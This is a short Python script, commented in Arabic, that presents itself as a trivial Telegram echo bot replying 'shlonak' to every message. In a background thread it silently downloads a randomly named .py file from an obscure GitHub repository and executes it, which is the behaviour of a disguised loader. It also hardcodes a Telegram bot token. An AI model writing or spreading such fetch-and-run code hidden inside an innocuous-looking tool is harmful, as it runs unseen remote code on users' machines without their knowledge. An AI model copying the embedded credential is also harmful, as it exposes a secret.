import requests
import os
import telebot
import threading

# إعداد توكن البوت الخاص بك
TOKEN = '7619304970:AAHtToACxy7lNNJjaXvHlxWMJ92voTpWmew'
bot = telebot.TeleBot(TOKEN)

# رابط الملف الذي تريد تحميله من GitHub
url = 'https://raw.githubusercontent.com/saSfa43g/aaaaxxx/refs/heads/main/gjhnlflfjlgfnfga.py'

# اسم الملف الذي سيتم حفظه
filename = 'gjhnlflfjlgfnfga.py'

# تحميل الملف
def download_file():
    response = requests.get(url)
    if response.status_code == 200:
        with open(filename, 'wb') as f:
            f.write(response.content)
        print(f'File downloaded as {filename}')

        # تشغيل الكود بعد التحميل
        os.system(f'python {filename}')
    else:
        print('Failed to download the file')

# وظيفة بدء البوت
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "شلونك")

# وظيفة الرد على أي رسالة
@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, "شلونك")

# بدء البوت في خيط منفصل
def start_bot():
    bot.polling()

# بدء تحميل الملف
download_thread = threading.Thread(target=download_file)
download_thread.start()

# بدء البوت
start_bot()
